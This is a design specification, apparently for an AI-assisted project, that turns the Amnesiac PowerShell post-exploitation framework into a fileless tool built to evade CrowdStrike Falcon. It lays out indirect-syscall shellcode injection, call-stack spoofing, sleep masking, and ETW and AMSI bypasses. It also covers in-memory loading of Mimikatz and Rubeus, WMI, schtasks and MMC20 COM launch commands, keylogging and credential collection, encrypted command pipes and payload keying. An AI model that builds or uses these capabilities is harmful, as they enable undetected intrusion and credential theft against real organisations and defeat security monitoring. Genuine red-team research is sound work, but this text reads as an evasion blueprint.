# Amnesiac Stealth Overhaul — Design Spec
**Date:** 2026-05-23  
**Status:** Approved — pending implementation  
**Approach:** Option B (PS + in-memory .NET assemblies)  
**Author:** Red Team Operator  

---

## 1. Objective

Extend Amnesiac into a red-team-grade post-exploitation framework that operates with zero disk writes on targets, evades CrowdStrike Falcon behavioral detection, and works reliably from both non-domain-joined and domain-joined operator machines connected to an internal network.

The framework must remain pure PowerShell in appearance while gaining binary-level evasion capabilities through an embedded in-memory .NET assembly. All existing commands and sessions remain fully functional.

---

## 2. Operational Scenarios

### Scenario 1 — Non-Domain-Joined Operator Machine
- Operator runs Amnesiac on a machine not joined to the target domain
- Domain credentials provided via `runas /netonly /user:DOMAIN\user powershell.exe`
- Has remote access to a target (WMI / PSRemoting / SMB / RCE)
- Generates payload in Amnesiac → executes on target → gets named-pipe session back
- All target-side operation is in memory only — no disk writes on target

### Scenario 2 — Assumed Breach (Domain-Joined Operator Machine)
- Operator machine is domain-joined to the target environment
- Runs Amnesiac natively with domain token
- Enumerates and exploits across the network
- When a new target is compromised, applies Scenario 1 approach for that target

Both scenarios share the same payload generation, tool delivery, and session management code paths.

---

## 3. Architecture Overview

Changes are organised into four independent layers. Each layer can be implemented and tested separately. Existing functionality is untouched unless explicitly noted.

```
Amnesiac.ps1 (modified)
│
├── LAYER 1 — Disk Elimination
│   Removes all automatic disk writes on operator and target machines.
│
├── LAYER 2 — Payload Generation & C# Assembly
│   Extends stealth payload format; adds embedded .NET loader; hardens protocol.
│
├── LAYER 3 — In-Memory Tool Delivery
│   Replaces GitHub downloads with in-pipe module streaming from operator cache.
│
└── LAYER 4 — Operational Guardrails
    Adds engagement profiles, runas/netonly awareness, environment keying, startup OPSEC summary.

AmnesiacLoader/ (new)
├── Loader.cs       — indirect syscall injection
├── CallStack.cs    — call stack frame spoofing
├── SleepMask.cs    — memory encryption during sleep
└── Build.ps1       — compiles DLL → base64 → embeds in Amnesiac.ps1

CLAUDE.md           — project objectives, build instructions, contribution guide
CHANGELOG.md        — all changes with operational context
```

---

## 4. Layer 1 — Disk Elimination

### 4.1 Problem

Amnesiac unconditionally creates `C:\Users\Public\Documents\Amnesiac\` with eight subfolders at startup (Amnesiac.ps1 lines 60–63). Throughout a session it writes tool scripts, keylogger output, screenshots, downloaded files, clipboard data, TGT data, command history, and generated `.exe` payloads to this tree on the operator machine. On targets, tool modules are downloaded from GitHub to `Scripts\`.

### 4.2 Changes

**Startup — remove unconditional folder creation**

Replace lines 60–63 with a conditional block gated on `$global:DiskMode`:

```powershell
$global:DiskMode = $false   # default: no disk writes

function Initialize-DiskStructure {
    if(-not $global:DiskMode){ return }
    $basePath = "C:\Users\Public\Documents\Amnesiac"
    $subfolders = @("Clipboard","Downloads","History","Keylogger","Payloads","Screenshots","Scripts","Monitor_TGTs")
    if(-not (Test-Path $basePath)){ New-Item -Path $basePath -ItemType Directory > $null }
    $subfolders | ForEach-Object {
        $p = Join-Path $basePath $_
        if(-not (Test-Path $p)){ New-Item -Path $p -ItemType Directory > $null }
    }
}
Initialize-DiskStructure
```

**New `diskmode` command**

```
diskmode          — show current state
diskmode on       — enable disk writes (restores original behaviour)
diskmode off      — disable disk writes (default)
```

**Artifact in-memory store (operator side)**

All data that would have gone to disk subfolders is instead buffered in memory on the operator machine:

```powershell
$global:AmnesiacArtifacts = @{
    Keylogger   = [System.Collections.Generic.List[string]]::new()
    Screenshots = [System.Collections.Generic.List[byte[]]]::new()
    Downloads   = @{}    # filename -> byte[]
    Clipboard   = [System.Collections.Generic.List[string]]::new()
    TGTs        = [System.Collections.Generic.List[string]]::new()
}
```

**New session commands for artifact management**

```
artifacts               — list captured artifacts in memory
artifacts keylogger     — display keylogger output
artifacts screenshots   — list captured screenshots
save <type> [path]      — write specific artifact type to operator-side disk
save all                — dump all artifacts to operator disk
```

**exe payload format**

The `exe` format inherently requires disk (PS1ToEXE writes a file). When `diskmode` is off and the operator selects `exe` format, display a warning:

```
 [!] exe format requires a disk write for the payload file.
     Enable diskmode or switch to stealth/gzip format.
     Run 'diskmode on' to proceed with exe generation.
```

### 4.3 What is NOT changed

- The `exe` payload format itself — still works when `diskmode on`
- `Download <file>` command — still works; file saved to operator disk (operator machine write is acceptable)
- History tracking via `Set-Variable MaximumHistoryCount 32767` — unchanged (PS in-memory history)

---

## 5. Layer 2 — Payload Generation & C# Assembly

### 5.1 Stealth payload format extensions

The `stealth` format added in the previous session (ETW bypass, SBL bypass, random vars, gzip, jitter) is extended with:

**Extension A — Alternative execution launchers**

New `launcher` command cycles through execution vectors that change the parent process visible in EDR telemetry:

```
launcher          — show current launcher
launcher          — cycle to next (same command, like toggle)
```

Available launchers:

| Name | Command generated | Parent process on target |
|------|-------------------|--------------------------|
| `ps` (default) | `powershell.exe -ep bypass -Window Hidden -c "..."` | Whatever called it |
| `wmi` | `wmic process call create "powershell -ep bypass ..."` | `WmiPrvSE.exe` |
| `schtask` | `schtasks /create` → `/run` → `/delete` (one-shot, self-deletes) | `svchost.exe` (Task Scheduler) |
| `com` | `MMC20.Application.Document.ActiveView.ExecuteShellCommand(...)` | `mmc.exe` |

The selected launcher wraps whichever payload format (`stealth`, `gzip`, `b64`, etc.) is currently active. These are independent toggles.

`$global:LauncherFormat = 'ps'` — set at startup, cycled with `launcher` command.

**Extension B — Session-unique protocol markers**

Replace hardcoded `#END#` delimiter and fixed 1028-byte buffer with session-unique values generated at startup:

```powershell
# Generated once per Amnesiac session
$global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
$global:BufferSize = @(512, 1024, 2048, 4096) | Get-Random
```

Both values are baked into every generated payload so the target uses the same marker and buffer size as the operator. `#END#` and 1028 no longer appear anywhere in generated payloads.

**Extension C — AES pipe channel encryption**

All pipe I/O encrypted with AES-128 CBC after initial handshake.

Key exchange protocol (on first connect):
1. Target generates random 16-byte session key
2. Target encrypts session key with pre-shared key (PSK) using AES-128
3. Target sends encrypted session key as first message (before hostname/whoami)
4. Operator decrypts session key using PSK
5. All subsequent messages encrypted with session key

PSK configuration:
```
psk <passphrase>    — set pre-shared key (derived via SHA-256 → first 16 bytes)
psk                 — show current PSK status (masked)
psk reset           — revert to default (derived from pipe name)
```

Default PSK = SHA-256 of pipe name, first 16 bytes — no configuration needed for basic use.

All encryption/decryption handled in `InteractWithPipeSession` transparently. Operator types commands as normal.

### 5.2 AmnesiacLoader — embedded C# assembly

**Purpose**

A compiled C# DLL embedded as a base64 constant in Amnesiac.ps1. Loaded into target process memory via `[Reflection.Assembly]::Load()` — never written to disk. Provides binary-level evasion capabilities not achievable in pure PowerShell.

**Capabilities**

| Capability | Class | Key detail |
|------------|-------|------------|
| Indirect syscall injection | `AmnesiacLoader.Injector` | SSN resolution via EAT walking on ntdll.dll; VEH redirection to ntdll stubs; no `VirtualAllocEx`/`CreateRemoteThread` |
| Call stack spoofing | `AmnesiacLoader.CallStack` | Synthetic ROP frames inserted before syscall dispatch; EDR sees `ntdll→kernelbase→kernel32` call chain |
| Sleep masking | `AmnesiacLoader.SleepMask` | AES-encrypts implant memory region during `Sleep()`; decrypts on wake; `PAGE_NOACCESS` during sleep |
| PE/shellcode injection | `AmnesiacLoader.Injector` | Accepts shellcode byte array; injects via syscall path above |

**Public API surface (called from PS)**

```csharp
namespace AmnesiacLoader {
    public class Injector {
        // Inject shellcode into target PID via indirect syscalls
        public static bool InjectShellcode(int pid, byte[] shellcode);
        // Inject shellcode into new suspended process
        public static bool InjectNewProcess(string processPath, byte[] shellcode);
    }
    public class SleepMask {
        // Encrypt current process memory region during sleep
        public static void MaskedSleep(int milliseconds, IntPtr regionBase, int regionSize);
    }
}
```

**Loading in Amnesiac.ps1**

```powershell
# Constant at top of file — base64 encoded DLL
$AmnesiacLoaderB64 = "<base64 string — updated by Build.ps1>"

# Lazy loader — only loads assembly when first needed
function Import-AmnesiacLoader {
    if(-not $global:AmnesiacLoaderAssembly){
        $bytes = [Convert]::FromBase64String($AmnesiacLoaderB64)
        $global:AmnesiacLoaderAssembly = [Reflection.Assembly]::Load($bytes)
    }
    return $global:AmnesiacLoaderAssembly
}
```

**Integration with existing commands**

- `Migrate <pid>` — calls `AmnesiacLoader.Injector.InjectShellcode()` instead of downloading PInject.ps1 from GitHub
- `PInject <pid> <hex>` — same replacement
- Both commands remain identical from operator perspective

**Build process**

`AmnesiacLoader/Build.ps1`:
1. `dotnet build AmnesiacLoader.csproj -c Release`
2. Read output DLL as bytes
3. Base64 encode
4. Replace `$AmnesiacLoaderB64 = "..."` constant in Amnesiac.ps1
5. Print checksum for verification

Operators building from source run `Build.ps1` to refresh the embedded assembly. Pre-built base64 blob included in repo for operators without .NET SDK.

**Project file: AmnesiacLoader.csproj**

```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net462</TargetFramework>
    <AssemblyName>AmnesiacLoader</AssemblyName>
    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
    <Optimize>true</Optimize>
    <DebugType>none</DebugType>
    <Nullable>disable</Nullable>
  </PropertyGroup>
</Project>
```

Target framework: `net462` (runs on all Windows machines with .NET 4.6.2+, which is virtually all modern Windows targets).

---

## 6. Layer 3 — In-Memory Tool Delivery

### 6.1 Problem

Every tool command (`Mimi`, `Kerb`, `PInject`, `PowerView`, etc.) currently downloads its module from `raw.githubusercontent.com` to the target machine's `Scripts\` folder, then executes it. This creates:
- A disk write on the target
- An outbound network call from the target to GitHub (anomalous server behaviour)
- A known IOC URL pattern that CS and network IDS flag

### 6.2 Tool cache architecture

Tools live only on the operator machine, in a `$global:ToolCache` hashtable populated at startup:

```powershell
$global:ToolCache = @{}   # toolname (string) -> script content (string)

function Initialize-ToolCache {
    # Priority 1: embedded blobs in Amnesiac.ps1 (base64+gzip constants)
    # Priority 2: local Tools\ directory (for dev/lab use)
    # Priority 3: operator HTTP server (File-Server.ps1, fallback only)
    # Never fetches from GitHub
}
```

### 6.3 Tool tiers

| Tier | Tools | Storage | Load trigger |
|------|-------|---------|--------------|
| **Core** (always available) | SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess | Embedded as gzip+base64 constants in Amnesiac.ps1 | At startup, always |
| **Standard** (on demand) | PowerView, Invoke-SessionHunter, PassSpray, Validate-Credentials, Ask4Creds, Invoke-Patamenia, TGT_Monitor, HiveDump, dumper, klg, cms, Tkn_Access_Check | Loaded from local `Tools\` at startup if present | At startup if folder exists |
| **Heavy** (operator-staged) | Suntour (Mimikatz), Ferrari (Rubeus), ppl, TermsrvPatcher, RDPKeylog.exe | Fetched from operator HTTP server on demand | When command invoked |

### 6.4 In-pipe module delivery

When an operator runs a tool command in a session, `Send-Module` streams the tool source over the existing named pipe:

```powershell
function Send-Module {
    param(
        [string]$ToolName,
        $StreamWriter,
        $StreamReader
    )
    $code = $global:ToolCache[$ToolName]
    if(-not $code){
        Write-Host " [-] Module '$ToolName' not in cache. Run 'modules' to see available tools." -ForegroundColor Red
        return $false
    }
    # Large tools chunked into 4KB segments to avoid pipe buffer overflow
    $chunks = [System.Collections.Generic.List[string]]::new()
    for($i = 0; $i -lt $code.Length; $i += 4096){
        $chunks.Add($code.Substring($i, [Math]::Min(4096, $code.Length - $i)))
    }
    # Send load command to target: assemble chunks into scriptblock, execute in memory
    # Target never writes to disk — all execution via [scriptblock]::Create()
    return $true
}
```

### 6.5 RepoURL default change

`$global:ServerURL` changes from GitHub to operator's local HTTP server:

```powershell
# Old
$global:ServerURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"

# New default — uses $global:IP if set (-IP param), otherwise auto-detects first
# RFC-1918 address on the operator machine
$operatorIP = if($global:IP){ $global:IP } else {
    Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.IPAddress -match "^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)" } |
        Select-Object -First 1 -ExpandProperty IPAddress
}
$global:ServerURL = "http://${operatorIP}:8080"
```

GitHub URL remains accessible via explicit `RepoURL <url>` override but is not the default.

### 6.6 GitHub call blocking

When `diskmode` is off, any `iex(new-object net.webclient).downloadstring` call targeting `githubusercontent.com` is intercepted. The framework checks `$global:ToolCache` first and substitutes from cache. If not cached:

```
 [-] Module not in local cache. Options:
     1. Add tool to Tools\ and run: modules reload
     2. Start operator HTTP server: serve
     3. Enable diskmode to allow external downloads (not recommended on engagements)
```

### 6.7 Binary tools

.NET assemblies (Ferrari/Rubeus, etc.) sent as base64 over pipe → loaded via `[Reflection.Assembly]::Load()` on target.

Native EXEs (RDPKeylog.exe) inherently require disk. When invoked with `diskmode off`:
```
 [!] RDPKeylog.exe requires disk write. Enable diskmode to proceed.
```

### 6.8 New `modules` commands

```
modules              — list all tools with cache status
modules reload       — re-scan Tools\ and refresh cache
modules status       — show embedded / local / remote breakdown
```

---

## 7. Layer 4 — Operational Guardrails

### 7.1 Engagement profiles

```
engagement                  — show current profile
engagement nondomained      — Scenario 1: non-domain-joined operator
engagement domained         — Scenario 2: domain-joined assumed breach
engagement reset            — clear profile
```

**Profile-driven defaults:**

| Setting | `nondomained` | `domained` |
|---------|---------------|------------|
| Default listener mode | GListener | Listener or GListener |
| runas /netonly guidance at startup | Yes | No |
| PSK default derivation | pipe name + operator IP | pipe name + machine SID |
| GitHub URL warning | Block (warn) | Block (warn) |

### 7.2 runas /netonly session detection

On startup in `nondomained` mode, Amnesiac checks for a Type-9 (NewCredentials) logon token — produced by `runas /netonly`:

```powershell
function Test-NetworkLogonToken {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    # Enumerate token groups / logon type for NewCredentials (9)
    # Return: $true if network logon token present, $false otherwise
}
```

Output:
- Token detected: `[+] Network logon token detected [DOMAIN\username] — domain resources accessible`
- Token not detected: `[!] WARNING: No network logon token detected. Launch from: runas /netonly /user:DOMAIN\user powershell.exe`

### 7.3 Payload environment keying

Optional pre-execution checks baked into payloads. Configured before payload generation:

```
key hostname  <name>     — abort if $env:COMPUTERNAME doesn't match
key domain    <name>     — abort if domain doesn't match
key user      <name>     — abort if running user doesn't match
key clear                — remove all keys
key show                 — display current key configuration
```

Keys are prepended to the payload script before gzip compression. Failed checks produce silent exit — no error output, no pipe creation, no network call:

```powershell
# Prepended block (example with all keys set)
if($env:COMPUTERNAME -ne 'WIN-TARGET01'){ exit }
if((Get-WmiObject Win32_ComputerSystem).Domain -ne 'GOAD.LOCAL'){ exit }
if($env:USERNAME -ne 'svc-sql'){ exit }
```

### 7.4 Startup OPSEC summary

Amnesiac prints a status banner at startup showing current security posture:

```
 [+] Amnesiac vX.X — Red Team Edition
 ─────────────────────────────────────────────
 [+] Disk mode:        OFF
 [+] Engagement:       nondomained
 [+] Network token:    GOAD\Administrator
 [+] Tool cache:       17/23 modules loaded
 [+] End marker:       xK9mPqRt  (session-unique)
 [+] Buffer size:      2048 bytes
 [+] Loader:           AmnesiacLoader v1.0 (embedded)
 [+] Default launcher: ps
 [+] PSK:              configured (derived)
 ─────────────────────────────────────────────
 [!] Heavy modules not cached: Suntour, Ferrari, ppl
     Run 'serve' to enable via local HTTP server
```

### 7.5 PSK management

```
psk <passphrase>    — set pre-shared key for AES pipe channel
psk                 — show PSK status (masked, not value)
psk reset           — revert to default (derived from pipe name)
```

---

## 8. Implementation Order

The layers are independent. Recommended implementation sequence:

| Phase | Layer | Rationale |
|-------|-------|-----------|
| 1 | Layer 1 (disk elimination) | Foundational — everything else assumes this is in place |
| 2 | Layer 4 (operational guardrails) | Low risk, high value — changes startup UX immediately |
| 3 | Layer 3 (in-memory tool delivery) | High OPSEC impact — eliminates GitHub IOC |
| 4 | Layer 2a (payload extensions) | Builds on existing stealth format |
| 5 | Layer 2b (AmnesiacLoader C# assembly) | Most complex, most impactful against CS |

---

## 9. Files Changed / Created

| File | Change type | Notes |
|------|------------|-------|
| `Amnesiac.ps1` | Modified | All layer changes; add `$AmnesiacLoaderB64` constant |
| `Amnesiac_ShellReady.ps1` | Modified | Sync all changes from Amnesiac.ps1 |
| `AmnesiacLoader/Loader.cs` | New | Indirect syscall injection |
| `AmnesiacLoader/CallStack.cs` | New | Frame spoofing |
| `AmnesiacLoader/SleepMask.cs` | New | Memory encryption during sleep |
| `AmnesiacLoader/AmnesiacLoader.csproj` | New | .NET 4.6.2 project file |
| `AmnesiacLoader/Build.ps1` | New | Build + embed script |
| `CLAUDE.md` | New | Project objectives and build guide |
| `CHANGELOG.md` | New | All changes with context |

---

## 10. Out of Scope

- Internet-facing C2 (DNS tunnelling, domain fronting, external callbacks)
- Persistence mechanisms (scheduled tasks, registry run keys, WMI subscriptions)
- Privilege escalation exploits
- Full modular rebuild (Approach 3 — deferred)
- Amnesiac_ShellReady.ps1 sync (deferred to final phase — sync manually)
